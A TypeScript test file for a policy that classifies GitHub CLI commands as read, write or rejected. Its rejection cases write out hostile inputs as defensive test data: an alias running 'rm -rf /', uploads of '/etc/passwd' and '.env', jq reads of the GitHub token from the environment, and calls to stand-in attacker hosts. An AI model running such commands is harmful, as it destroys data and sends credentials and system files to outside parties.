import { expect, test } from 'vitest';
import { classifyGh, GhPolicyError, shellQuote } from './policy.ts';

const classify = (...args: string[]) => classifyGh(args);

test.each([
  ['issue', 'list', '--label', 'bug', '--json', 'number,title'],
  ['issue', 'view', '12', '--comments'],
  ['pr', 'checks', '42'],
  ['pr', 'diff', '42'],
  ['run', 'view', '123', '--log-failed'],
  ['workflow', 'list'],
  ['release', 'list'],
  ['variable', 'get', 'NAME'],
  ['search', 'issues', 'flaky test', '--', '-label:wontfix'],
  ['issue', 'view', 'https://github.com/chattocorp/chatto/issues/1'],
  ['issue', 'list', '-L', '5'],
  ['api', 'repos/{owner}/{repo}/issues/12/comments'],
  ['api', 'search/issues', '-X', 'GET', '-f', 'q=repo:chattocorp/chatto flaky'],
  ['api', 'graphql', '-f', 'query={ repository(owner:"a", name:"b") { id } }']
])('reads run with the read-only token: %j', (...args) => {
  expect(classify(...args)).toEqual({ access: 'read' });
});

test.each([
  // Any change to the repository is available; the App's permissions decide what succeeds.
  ['issue', 'create', '--title', 'Flaky test', '--body', 'Details'],
  ['issue', 'edit', '12', '--add-label', 'bug', '--title', 'Better title'],
  ['issue', 'comment', '12', '--body', 'Fixed in #13'],
  ['issue', 'close', '12', '--reason', 'completed'],
  ['issue', 'lock', '12'],
  ['issue', 'transfer', '12', 'chattocorp/other'],
  ['pr', 'comment', '42', '--body', 'Looks good'],
  ['pr', 'merge', '42', '--squash'],
  ['label', 'delete', 'stale', '--yes'],
  ['run', 'rerun', '123', '--failed'],
  ['run', 'cancel', '123'],
  ['workflow', 'run', 'ci.yml', '-f', 'debug=true'],
  ['api', 'repos/{owner}/{repo}/issues/12/labels', '-f', 'labels[]=bug'],
  ['api', '-X', 'DELETE', 'repos/{owner}/{repo}/actions/runs/1'],
  ['api', 'graphql', '-f', 'query=mutation { closeIssue(input:{}) { clientMutationId } }']
])('changes run after the authorization check: %j', (...args) => {
  expect(classify(...args)).toEqual({ access: 'write' });
});

test.each([
  // Programs, credentials, and local configuration.
  [['alias', 'set', 'x', '!rm -rf /']],
  [['extension', 'install', 'someone/gh-thing']],
  [['auth', 'token']],
  [['config', 'set', 'editor', 'vim']],
  [['gist', 'create', 'secret.txt']],
  [['codespace', 'ssh']],
  [['attestation', 'download', 'x']],
  // Local files and Git state.
  [['issue', 'create', '--body-file', '/etc/passwd']],
  [['issue', 'create', '-F', '/etc/passwd']],
  [['release', 'create', 'v1', '/etc/passwd']],
  [['release', 'edit', 'v1', '--notes-file', '/etc/passwd']],
  [['secret', 'set', '--env-file', '.env']],
  [['workflow', 'run', 'ci.yml', '--field', 'x=@/etc/passwd']],
  [['api', 'repos/{owner}/{repo}/issues', '-F', 'body=@/etc/passwd']],
  [['api', 'repos/{owner}/{repo}/issues', '--input', 'payload.json']],
  [['run', 'download', '1']],
  [['release', 'download', 'v1']],
  [['repo', 'clone', 'chattocorp/chatto']],
  [['pr', 'checkout', '42']],
  // Browser and editor.
  [['issue', 'view', '1', '--web']],
  [['issue', 'create', '-e']],
  // The token is in the gh configuration; jq must not read the environment either.
  [['issue', 'list', '--json', 'title', '--jq', '$ENV']],
  // Clusters and attached values hide flags from these checks.
  [['issue', 'view', '1', '--json', 'title', '-cq', '$ENV.GH_TOKEN']],
  [['issue', 'list', '-cRother/repo']],
  [['api', 'repos/{owner}/{repo}/issues/1/comments', '-F=body=@/etc/passwd']],
  [['issue', 'list', '-L5']],
  // Another host or repository.
  [['issue', 'list', '--repo', 'other/repo']],
  [['api', 'repos/{owner}/{repo}', '--hostname', 'evil.example']],
  [['api', 'https://evil.example/steal']],
  [['api', 'repos/chattocorp/chatto/../../user']],
  [['issue', 'view', 'https://attacker.example/o/r/issues/1']],
  [['api', 'repos/{owner}/{repo}/issues', '--unknown-flag']]
])('the policy rejects %j', (args) => {
  expect(() => classify(...args)).toThrow(GhPolicyError);
});

test('an issue title can mention env with -t', () => {
  expect(classify('issue', 'create', '-t', 'Fix .env loading', '-b', 'x')).toEqual({
    access: 'write'
  });
});

test('shellQuote quotes only when needed', () => {
  expect(shellQuote('issue')).toBe('issue');
  expect(shellQuote("it's a bug")).toBe(`'it'\\''s a bug'`);
  expect(shellQuote('--body=two\nlines')).toBe(`'--body=two\nlines'`);
});
